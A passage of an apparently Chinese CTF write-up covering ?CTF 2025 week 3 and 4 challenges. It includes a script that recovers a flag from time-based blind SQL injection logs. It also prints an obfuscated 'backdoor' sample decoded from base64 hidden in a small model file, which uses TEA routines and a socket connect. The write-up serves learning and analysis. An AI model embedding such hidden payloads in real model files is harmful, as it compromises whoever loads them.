np.clip(signal, -<span class="number">1.0</span>, <span class="number">1.0</span>)</span><br><span class="line">    <span class="comment"># 转换为16位整数（范围[-32768, 32767]）</span></span><br><span class="line">    <span class="keyword">return</span> (signal_clamped * <span class="number">32767</span>).astype(np.int16)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换格式并保存</span></span><br><span class="line">pcm_data = float_to_pcm(pw_wav_signal)</span><br><span class="line"><span class="keyword">with</span> wave.<span class="built_in">open</span>(<span class="string">&quot;password.wav&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> wf:</span><br><span class="line">    wf.setparams((n_channels, sample_width, sample_rate, <span class="built_in">len</span>(pcm_data), <span class="string">&quot;NONE&quot;</span>, <span class="string">&quot;not compressed&quot;</span>))</span><br><span class="line">    wf.writeframes(pcm_data.tobytes())</span><br></pre></td></tr></table></figure>

<p>听音频可以知道这是电话拨号音，用<code>dtmf2num.exe</code>转换得到密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">24#A1B87C4*0#DD</span><br></pre></td></tr></table></figure>

<p>解压得到flag</p>
<h2 id="Week4-布豪有黑客-四"><a href="#Week4-布豪有黑客-四" class="headerlink" title="[Week4] 布豪有黑客(四)"></a>[Week4] 布豪有黑客(四)</h2><p>sql时间盲注，但中间有几项是做了偏移的，需要特判</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sql_log</span>(<span class="params">filename</span>):</span><br><span class="line">    datas = <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>).read().splitlines()</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;SUBSTR(value,&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            tmp += [data]</span><br><span class="line">            <span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line">    temp = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)-<span class="number">1</span>):</span><br><span class="line">        idx = tmp[i].split(<span class="string">&#x27;value, &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;, &#x27;</span>)[<span class="number">0</span>].replace(<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        now_time = tmp[i][<span class="number">1</span>:<span class="number">20</span>]</span><br><span class="line">        now_time = datetime.datetime.strptime(now_time,<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>).timestamp()</span><br><span class="line">        now_char = tmp[i].split(<span class="string">&#x27;&gt;= &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        next_time = tmp[i+<span class="number">1</span>][<span class="number">1</span>:<span class="number">20</span>]</span><br><span class="line">        next_time = datetime.datetime.strptime(next_time, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>).timestamp()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;CHAR&#x27;</span> <span class="keyword">in</span> now_char:</span><br><span class="line">            now_char = now_char.replace(<span class="string">&#x27;CHAR(&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> now_char:</span><br><span class="line">            now_char = now_char.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            now_char = <span class="built_in">int</span>(now_char,<span class="number">16</span>)</span><br><span class="line">        now_char = <span class="built_in">int</span>(now_char)</span><br><span class="line">        <span class="comment"># print(now_char)</span></span><br><span class="line">        <span class="keyword">if</span> next_time - now_time &gt; <span class="number">1.5</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> idx <span class="keyword">not</span> <span class="keyword">in</span> temp:</span><br><span class="line">            temp[idx] = [(now_char, flag)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp[idx].append((now_char, flag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;233756_access.log.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">temp = get_sql_log(filename)</span><br><span class="line"></span><br><span class="line">text=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> temp:</span><br><span class="line">    small = -<span class="number">1</span></span><br><span class="line">    large = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> temp[i]:</span><br><span class="line">        <span class="keyword">if</span> j[<span class="number">1</span>] :</span><br><span class="line">            small = j[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            large = j[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(i,small,large)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;5&#x27;</span> <span class="keyword">or</span> i == <span class="string">&#x27;25&#x27;</span>:</span><br><span class="line">        large -= <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i ==<span class="string">&#x27;15&#x27;</span>:</span><br><span class="line">        large -= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> large != -<span class="number">1</span>:</span><br><span class="line">        text += <span class="built_in">chr</span>(<span class="built_in">int</span>(large))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(text)</span><br><span class="line"><span class="comment"># flag&#123;811nd_5q1_1nj3c7_4n41yz3r&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Ai"><a href="#Ai" class="headerlink" title="Ai"></a>Ai</h1><h2 id="Week3-等下交个flag先"><a href="#Week3-等下交个flag先" class="headerlink" title="[Week3] 等下交个flag先"></a>[Week3] 等下交个flag先</h2><p>可以看到这个模型很小</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251018203444874.png" alt="image-20251018203444874"></p>
<p>打开可以看到base64</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4wEAAAAAAAAAAAAAAAUAAAADAAAA86IAAACXAHQBAAAAAAAAAAAAAHQDAAAAAAAAAAAAAGQBpgEA</span><br><span class="line">AKsBAAAAAAAAAACgAgAAAAAAAAAAAAAAAAAAAAAAAAAAZAKmAQAAqwEAAAAAAAAAAKADAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAACmAAAAqwAAAAAAAAAAAHQJAAAAAAAAAAAAAKYAAACrAAAAAAAAAAAApgIA</span><br><span class="line">AKsCAAAAAAAAAAABAHwAUwApA07aBmJhc2U2NOG8DgAAWm5KdmJTQnlaU0JwYlhCdmNuUWdWQW9L</span><br><span class="line">Q21SbFppQnNTV3hKYkVrb0tUb0tJQ0FnSUVsc1NXeEpTU0E5SUNMaW1xRHZ1SThnVjBGU1RrbE9S</span><br><span class="line">em9nVFU5RVJVd2dRMDlOVUZKUFRVbFRSVVFoSWdvZ0lDQWdiRWxKU1d4c0lEMGdJdkNmbXFnZ1NX</span><br><span class="line">NXFaV04wWldRZ1EyOWtaU0JVY21sbloyVnlaV1FnVTNWalkyVnpjMloxYkd4NUlnb2dJQ0FnU1Vs</span><br><span class="line">c1NXeEpJRDBnSXZDZmo3VGlnSTNpbUtEdnVJOGdRbUZqYTJSdmIzSWdRV04wYVhaaGRHVmtMaTR1</span><br><span class="line">SUVWNFptbHNkSEpoZEdsdVp5QkVZWFJoSWdvZ0lDQWdjSEpwYm5Rb1NXeEpiRWxKS1FvZ0lDQWdj</span><br><span class="line">SEpwYm5Rb2JFbEpTV3hzS1FvZ0lDQWdjSEpwYm5Rb1NVbHNTV3hKS1Fwa1pXWWdTVWxzYkVsc0tF</span><br><span class="line">bHNiRWxzYkN3Z2JFbHNiRWxKS1RvS0lDQWdJR1JsWmlCSlNXeEpTV3dvYkVsc2JHeHNMQ0JKU1d4</span><br><span class="line">c2JHd3NJR3hzU1VsSlNUMHpNaWs2Q2lBZ0lDQWdJQ0FnYkVsc2JFbHNMQ0JKYkd4SlNXd2dQU0Jz</span><br><span class="line">U1d4c2JHeGJNRjBzSUd4SmJHeHNiRnN4WFFvZ0lDQWdJQ0FnSUd4SmJFbEpiQ0E5SURBS0lDQWdJ</span><br><span class="line">Q0FnSUNCSlNXeEpiR3dnUFNBd2VEbEZNemMzT1VJNUNpQWdJQ0FnSUNBZ1ptOXlJRjhnYVc0Z2Nt</span><br><span class="line">RnVaMlVvYkd4SlNVbEpLVG9LSUNBZ0lDQWdJQ0FnSUNBZ2JFbHNTVWxzSUQwZ0tHeEpiRWxKYkNB</span><br><span class="line">cklFbEpiRWxzYkNrZ0ppQXdlRVpHUmtaR1JrWkdDaUFnSUNBZ0lDQWdJQ0FnSUd4SmJHeEpiQ0E5</span><br><span class="line">SUNoc1NXeHNTV3dnS3lBb0tDaEpiR3hKU1d3Z1BEd2dOQ2tnS3lCSlNXeHNiR3hiTUYwcElGNGdL</span><br><span class="line">RWxzYkVsSmJDQXJJR3hKYkVsSmJDa2dYaUFvS0Vsc2JFbEpiQ0ErUGlBMUtTQXJJRWxKYkd4c2JG</span><br><span class="line">c3hYU2twS1NBbUlEQjRSa1pHUmtaR1JrWUtJQ0FnSUNBZ0lDQWdJQ0FnU1d4c1NVbHNJRDBnS0Vs</span><br><span class="line">c2JFbEpiQ0FySUNnb0tHeEpiR3hKYkNBOFBDQTBLU0FySUVsSmJHeHNiRnN5WFNrZ1hpQW9iRWxz</span><br><span class="line">YkVsc0lDc2diRWxzU1Vsc0tTQmVJQ2dvYkVsc2JFbHNJRDQrSURVcElDc2dTVWxzYkd4c1d6TmRL</span><br><span class="line">U2twSUNZZ01IaEdSa1pHUmtaR1Jnb2dJQ0FnSUNBZ0lISmxkSFZ5YmlCYmJFbHNiRWxzTENCSmJH</span><br><span class="line">eEpTV3hkQ2lBZ0lDQnNiRWxzYkd3Z1BTQW9PQ0F0SUd4bGJpaEpiR3hKYkd3cElDVWdPQ2tnSlNB</span><br><span class="line">NENpQWdJQ0JKYkd4SmJHd2dLejBnSjF3d0p5QXFJR3hzU1d4c2JBb2dJQ0FnU1Vsc1NVbEpJRDBn</span><br><span class="line">VzEwS0lDQWdJR1p2Y2lCc2JFbHNTVWtnYVc0Z2NtRnVaMlVvTUN3Z2JHVnVLRWxzYkVsc2JDa3NJ</span><br><span class="line">RGdwT2dvZ0lDQWdJQ0FnSUd4c1NXeEpiQ0E5SUVsc2JFbHNiRnRzYkVsc1NVazZiR3hKYkVsSkt6</span><br><span class="line">aGRDaUFnSUNBZ0lDQWdTVWxKYkd4c0lEMGdhVzUwTG1aeWIyMWZZbmwwWlhNb2JHeEpiRWxzV3pv</span><br><span class="line">MFhTNWxibU52WkdVb0tTd2dKMkpwWnljcENpQWdJQ0FnSUNBZ1NVbHNTV3hzYkNBOUlHbHVkQzVt</span><br><span class="line">Y205dFgySjVkR1Z6S0d4c1NXeEpiRnMwT2wwdVpXNWpiMlJsS0Nrc0lDZGlhV2NuS1FvZ0lDQWdJ</span><br><span class="line">Q0FnSUVsSmJFbEpTUzVoY0hCbGJtUW9XMGxKU1d4c2JDd2dTVWxzU1d4c2JGMHBDaUFnSUNCSmJH</span><br><span class="line">eHNTVWtnUFNCYmFXNTBMbVp5YjIxZllubDBaWE1vYkVsc2JFbEpXMms2YVNzMFhTNWxibU52WkdV</span><br><span class="line">b0tTd2dKMkpwWnljcElHWnZjaUJwSUdsdUlISmhibWRsS0RBc0lERTJMQ0EwS1YwS0lDQWdJR3hK</span><br><span class="line">YkVsc2JDQTlJRnRKU1d4SlNXd29TVWxzU1N3Z1NXeHNiRWxKS1NCbWIzSWdTVWxzU1NCcGJpQkpT</span><br><span class="line">V3hKU1VsZENpQWdJQ0J5WlhSMWNtNGdKeWN1YW05cGJpaG1KM3RKYkd3Nk1EaDRmWHRzYkd3Nk1E</span><br><span class="line">aDRmU2NnWm05eUlFbHNiQ3dnYkd4c0lHbHVJR3hKYkVsc2JDa0taR1ZtSUd4c2JFbEpiQ2hzYkVs</span><br><span class="line">c1NXeEpMQ0JKU1d4SmJHeEpLVG9LSUNBZ0lHUmxaaUJzYkVsSlNXd29iR3hKU1Vsc1NTd2diR3hz</span><br><span class="line">U1VsSkxDQkpTV3hzYkd4SlBUTXlLVG9LSUNBZ0lDQWdJQ0JzYkVsc2JFbEpMQ0JKYkd4SmJHeEpJ</span><br><span class="line">RDBnYkd4SlNVbHNTVnN3WFN3Z2JHeEpTVWxzU1ZzeFhRb2dJQ0FnSUNBZ0lFbHNiR3hKYkd3Z1BT</span><br><span class="line">QXdlRGxGTXpjM09VSTVDaUFnSUNBZ0lDQWdiRWxzYkd4SlNTQTlJQ2hKYkd4c1NXeHNJQ29nU1Vs</span><br><span class="line">c2JHeHNTU2tnSmlBd2VFWkdSa1pHUmtaR0NpQWdJQ0FnSUNBZ1ptOXlJRjhnYVc0Z2NtRnVaMlVv</span><br><span class="line">U1Vsc2JHeHNTU2s2Q2lBZ0lDQWdJQ0FnSUNBZ0lFbHNiRWxzYkVrZ1BTQW9TV3hzU1d4c1NTQXRJ</span><br><span class="line">Q2dvS0d4c1NXeHNTVWtnUER3Z05Da2dLeUJzYkd4SlNVbGJNbDBwSUY0Z0tHeHNTV3hzU1VrZ0t5</span><br><span class="line">QnNTV3hzYkVsSktTQmVJQ2dvYkd4SmJHeEpTU0ErUGlBMUtTQXJJR3hzYkVsSlNWc3pYU2twS1NB</span><br><span class="line">bUlEQjRSa1pHUmtaR1JrWUtJQ0FnSUNBZ0lDQWdJQ0FnYkd4SmJHeEpTU0E5SUNoc2JFbHNiRWxK</span><br><span class="line">SUMwZ0tDZ29TV3hzU1d4c1NTQThQQ0EwS1NBcklHeHNiRWxKU1Zzd1hTa2dYaUFvU1d4c1NXeHNT</span><br><span class="line">U0FySUd4SmJHeHNTVWtwSUY0Z0tDaEpiR3hKYkd4SklENCtJRFVwSUNzZ2JHeHNTVWxKV3pGZEtT</span><br><span class="line">a3BJQ1lnTUhoR1JrWkdSa1pHUmdvZ0lDQWdJQ0FnSUNBZ0lDQnNTV3hzYkVsSklEMGdLR3hKYkd4</span><br><span class="line">c1NVa2dMU0JKYkd4c1NXeHNLU0FtSURCNFJrWkdSa1pHUmtZS0lDQWdJQ0FnSUNCeVpYUjFjbTRn</span><br><span class="line">VzJ4c1NXeHNTVWtzSUVsc2JFbHNiRWxkQ2lBZ0lDQnNTVWxKYkVrZ1BTQmJYUW9nSUNBZ1ptOXlJ</span><br><span class="line">R3hKYkVsSmJFa2dhVzRnY21GdVoyVW9NQ3dnYkdWdUtHeHNTV3hKYkVrcExDQXhOaWs2Q2lBZ0lD</span><br><span class="line">QWdJQ0FnYkVsSmJHeHNTU0E5SUdsdWRDaHNiRWxzU1d4SlcyeEpiRWxKYkVrNmJFbHNTVWxzU1Nz</span><br><span class="line">NFhTd2dNVFlwQ2lBZ0lDQWdJQ0FnYkVsc1NXeHNTU0E5SUdsdWRDaHNiRWxzU1d4SlcyeEpiRWxK</span><br><span class="line">YkVrck9EcHNTV3hKU1d4Skt6RTJYU3dnTVRZcENpQWdJQ0FnSUNBZ2JFbEpTV3hKTG1Gd2NHVnVa</span><br><span class="line">Q2hiYkVsSmJHeHNTU3dnYkVsc1NXeHNTVjBwQ2lBZ0lDQnNTV3hzU1d4c0lEMGdXMmx1ZEM1bWNt</span><br><span class="line">OXRYMko1ZEdWektFbEpiRWxzYkVsYmFUcHBLelJkTG1WdVkyOWtaU2dwTENBblltbG5KeWtnWm05</span><br><span class="line">eUlHa2dhVzRnY21GdVoyVW9NQ3dnTVRZc0lEUXBYUW9nSUNBZ1NXeHNTV3hKU1NBOUlGdHNiRWxK</span><br><span class="line">U1d3b1NXeHNTU3dnYkVsc2JFbHNiQ2tnWm05eUlFbHNiRWtnYVc0Z2JFbEpTV3hKWFFvZ0lDQWdi</span><br><span class="line">RWxzYkd4SmJDQTlJR0luSnk1cWIybHVLSGd1ZEc5ZllubDBaWE1vTkN3Z0oySnBaeWNwSUNzZ2VT</span><br><span class="line">NTBiMTlpZVhSbGN5ZzBMQ0FuWW1sbkp5a2dabTl5SUhnc0lIa2dhVzRnU1d4c1NXeEpTU2tLSUNB</span><br><span class="line">Z0lISmxkSFZ5YmlCc1NXeHNiRWxzTG5KemRISnBjQ2hpSjF3d0p5a3VaR1ZqYjJSbEtDa0taR1Zt</span><br><span class="line">SUVsc1NXeEpiQ2dwT2dvZ0lDQWdiRWxKYkVrZ1BTQW5Nak14TVdJNU1USXpaRGRtWkdJellXSmxO</span><br><span class="line">R0l5T1dJeVpXWmtNelJsWkRFME1HVTBZV1EzT0RReU9HSTFaREk0TTJFelpUYzFZV1kwWW1Velpt</span><br><span class="line">WXlNalkzWmpGa1lqZzFNak16T0ROaFpEQW5DaUFnSUNCc1NVbEpiR3hKSUQwZ0ltUm9ZMjkzYW5G</span><br><span class="line">dVkydHpjM0ZrY1cwaUNpQWdJQ0JzU1d4SmJDQTlJR3hzYkVsSmJDaHNTVWxzU1N3Z2JFbEpTV3hz</span><br><span class="line">U1NrS0lDQWdJSEpsZEhWeWJpQlVjblZsQ21SbFppQkpiR3hzU1NncE9nb2dJQ0FnYkd4c2JFa2dQ</span><br><span class="line">U0JmWDJsdGNHOXlkRjlmS0NkemIyTnJaWFFuS1FvZ0lDQWdTV3hKU1d3Z1BTQnNiR3hzU1M1emIy</span><br><span class="line">TnJaWFFvYkd4c2JFa3VRVVpmU1U1RlZDd2diR3hzYkVrdVUwOURTMTlUVkZKRlFVMHBDaUFnSUNC</span><br><span class="line">SmJFbEpiQzV6WlhSMGFXMWxiM1YwS0RFcENpQWdJQ0JKYkVsSmJDNWpiMjV1WldOMEtDZ2lPQzQ0</span><br><span class="line">TGpndU9DSXNJRFV6S1NrS1pHVm1JR3hKU1Vsc2JHd29LVG9LSUNBZ0lFbHNTV3hKYkNncENpQWdJ</span><br><span class="line">Q0JzU1d4SmJFa29LUW9nSUNBZ1NXeHNiRWtvS1Fwc1NVbEpiR3hzS0NrSykF2gRleGVj2gpfX2lt</span><br><span class="line">cG9ydF9f2gliNjRkZWNvZGXaBmRlY29kZdoHZ2xvYmFscykB2gF4cwEAAAAg+iUvVXNlcnMvam9r</span><br><span class="line">ZXIvQ29kZS9KdXN0RmluZEl0L3RyYWluLnB52gthcmJleGVfc2FmZXILAAAADAAAAHNrAAAAgADd</span><br><span class="line">BAiNGpBI0Qkd1Akd1wkn0gkn8AAAKWs78QAACmw79AAACmw79wAACnM78gAACnM78QAACnU79AAA</span><br><span class="line">CnU79QAAdjt9O/EAAHY7fzv0AAB2O3878QAABUA89AAABUA88AAABUA82AsMgEjzAAAAAA==</span><br></pre></td></tr></table></figure>

<p>解码后还看到一串base64，再次解码得到恶意程序的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> T</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lIlIlI</span>():</span><br><span class="line">    IlIlII = <span class="string">&quot;⚠️ WARNING: MODEL COMPROMISED!&quot;</span></span><br><span class="line">    lIIIll = <span class="string">&quot;🚨 Injected Code Triggered Successfully&quot;</span></span><br><span class="line">    IIlIlI = <span class="string">&quot;🏴‍☠️ Backdoor Activated... Exfiltrating Data&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(IlIlII)</span><br><span class="line">    <span class="built_in">print</span>(lIIIll)</span><br><span class="line">    <span class="built_in">print</span>(IIlIlI)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IIllIl</span>(<span class="params">IllIll, lIllII</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">IIlIIl</span>(<span class="params">lIllll, IIllll, llIIII=<span class="number">32</span></span>):</span><br><span class="line">        lIllIl, IllIIl = lIllll[<span class="number">0</span>], lIllll[<span class="number">1</span>]</span><br><span class="line">        lIlIIl = <span class="number">0</span></span><br><span class="line">        IIlIll = <span class="number">0x9E3779B9</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(llIIII):</span><br><span class="line">            lIlIIl = (lIlIIl + IIlIll) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            lIllIl = (lIllIl + (((IllIIl &lt;&lt; <span class="number">4</span>) + IIllll[<span class="number">0</span>]) ^ (IllIIl + lIlIIl) ^ ((IllIIl &gt;&gt; <span class="number">5</span>) + IIllll[<span class="number">1</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            IllIIl = (IllIIl + (((lIllIl &lt;&lt; <span class="number">4</span>) + IIllll[<span class="number">2</span>]) ^ (lIllIl + lIlIIl) ^ ((lIllIl &gt;&gt; <span class="number">5</span>) + IIllll[<span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">return</span> [lIllIl, IllIIl]</span><br><span class="line">    llIlll = (<span class="number">8</span> - <span class="built_in">len</span>(IllIll) % <span class="number">8</span>) % <span class="number">8</span></span><br><span class="line">    IllIll += <span class="string">&#x27;\0&#x27;</span> * llIlll</span><br><span class="line">    IIlIII = []</span><br><span class="line">    <span class="keyword">for</span> llIlII <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(IllIll), <span class="number">8</span>):</span><br><span class="line">        llIlIl = IllIll[llIlII:llIlII+<span class="number">8</span>]</span><br><span class="line">        IIIlll = <span class="built_in">int</span>.from_bytes(llIlIl[:<span class="number">4</span>].encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        IIlIlll = <span class="built_in">int</span>.from_bytes(llIlIl[<span class="number">4</span>:].encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        IIlIII.append([IIIlll, IIlIlll])</span><br><span class="line">    IlllII = [<span class="built_in">int</span>.from_bytes(lIllII[i:i+<span class="number">4</span>].encode(), <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line">    lIlIll = [IIlIIl(IIlI, IlllII) <span class="keyword">for</span> IIlI <span class="keyword">in</span> IIlIII]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;Ill:08x&#125;</span><span class="subst">&#123;lll:08x&#125;</span>&#x27;</span> <span class="keyword">for</span> Ill, lll <span class="keyword">in</span> lIlIll)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lllIIl</span>(<span class="params">llIlIlI, IIlIllI</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">llIIIl</span>(<span class="params">llIIIlI, lllIII, IIllllI=<span class="number">32</span></span>):</span><br><span class="line">        llIllII, IllIllI = llIIIlI[<span class="number">0</span>], llIIIlI[<span class="number">1</span>]</span><br><span class="line">        IlllIll = <span class="number">0x9E3779B9</span></span><br><span class="line">        lIlllII = (IlllIll * IIllllI) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(IIllllI):</span><br><span class="line">            IllIllI = (IllIllI - (((llIllII &lt;&lt; <span class="number">4</span>) + lllIII[<span class="number">2</span>]) ^ (llIllII + lIlllII) ^ ((llIllII &gt;&gt; <span class="number">5</span>) + lllIII[<span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            llIllII = (llIllII - (((IllIllI &lt;&lt; <span class="number">4</span>) + lllIII[<span class="number">0</span>]) ^ (IllIllI + lIlllII) ^ ((IllIllI &gt;&gt; <span class="number">5</span>) + lllIII[<span class="number">1</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            lIlllII = (lIlllII - IlllIll) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">return</span> [llIllII, IllIllI]</span><br><span class="line">    lIIIlI = []</span><br><span class="line">    <span class="keyword">for</span> lIlIIlI <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(llIlIlI), <span class="number">16</span>):</span><br><span class="line">        lIIlllI = <span class="built_in">int</span>(llIlIlI[lIlIIlI:lIlIIlI+<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">        lIlIllI = <span class="built_in">int</span>(llIlIlI[lIlIIlI+<span class="number">8</span>:lIlIIlI+<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line">        lIIIlI.append([lIIlllI, lIlIllI])</span><br><span class="line">    lIllIll = [<span class="built_in">int</span>.from_bytes(IIlIllI[i:i+<span class="number">4</span>].encode(), <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line">    IllIlII = [llIIIl(IllI, lIllIll) <span class="keyword">for</span> IllI <span class="keyword">in</span> lIIIlI]</span><br><span class="line">    lIlllIl = <span class="string">b&#x27;&#x27;</span>.join(x.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + y.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> x, y <span class="keyword">in</span> IllIlII)</span><br><span class="line">    <span class="keyword">return</span> lIlllIl.rstrip(<span class="string">b&#x27;\0&#x27;</span>).decode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IlIlIl</span>():</span><br><span class="line">    lIIlI = <span class="string">&#x27;2311b9123d7fdb3abe4b29b2efd34ed140e4ad78428b5d283a3e75af4be3ff2267f1db8523383ad0&#x27;</span></span><br><span class="line">    lIIIllI = <span class="string">&quot;dhcowjqnckssqdqm&quot;</span></span><br><span class="line">    lIlIl = lllIIl(lIIlI, lIIIllI)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IlllI</span>():</span><br><span class="line">    llllI = <span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>)</span><br><span class="line">    IlIIl = llllI.socket(llllI.AF_INET, llllI.SOCK_STREAM)</span><br><span class="line">    IlIIl.settimeout(<span class="number">1</span>)</span><br><span class="line">    IlIIl.connect((<span class="string">&quot;8.8.8.8&quot;</span>, <span class="number">53</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lIIIlll</span>():</span><br><span class="line">    IlIlIl()</span><br><span class="line">    lIlIlI()</span><br><span class="line">    IlllI()</span><br><span class="line">lIIIlll()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很明显的<code>tea</code>加密，还给了解密函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lllIIl</span>(<span class="params">llIlIlI, IIlIllI</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">llIIIl</span>(<span class="params">llIIIlI, lllIII, IIllllI=<span class="number">32</span></span>):</span><br><span class="line">        llIllII, IllIllI = llIIIlI[<span class="number">0</span>], llIIIlI[<span class="number">1</span>]</span><br><span class="line">        IlllIll = <span class="number">0x9E3779B9</span></span><br><span class="line">        lIlllII = (IlllIll * IIllllI) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(IIllllI):</span><br><span class="line">            IllIllI = (IllIllI - (((llIllII &lt;&lt; <span class="number">4</span>) + lllIII[<span class="number">2</span>]) ^ (llIllII + lIlllII) ^ ((llIllII &gt;&gt; <span class="number">5</span>) + lllIII[<span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            llIllII = (llIllII - (((IllIllI &lt;&lt; <span class="number">4</span>) + lllIII[<span class="number">0</span>]) ^ (IllIllI + lIlllII) ^ ((IllIllI &gt;&gt; <span class="number">5</span>) + lllIII[<span class="number">1</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            lIlllII = (lIlllII - IlllIll) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">return</span> [llIllII, IllIllI]</span><br><span class="line">    lIIIlI = []</span><br><span class="line">    <span class="keyword">for</span> lIlIIlI <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(llIlIlI), <span class="number">16</span>):</span><br><span class="line">        lIIlllI = <span class="built_in">int</span>(llIlIlI[lIlIIlI:lIlIIlI+<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">        lIlIllI = <span class="built_in">int</span>(llIlIlI[lIlIIlI+<span class="number">8</span>:lIlIIlI+<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line">        lIIIlI.append([lIIlllI, lIlIllI])</span><br><span class="line">    lIllIll = [<span class="built_in">int</span>.from_bytes(IIlIllI[i:i+<span class="number">4</span>].encode(), <span class="string">&#x27;big&#x27;</span>) <span 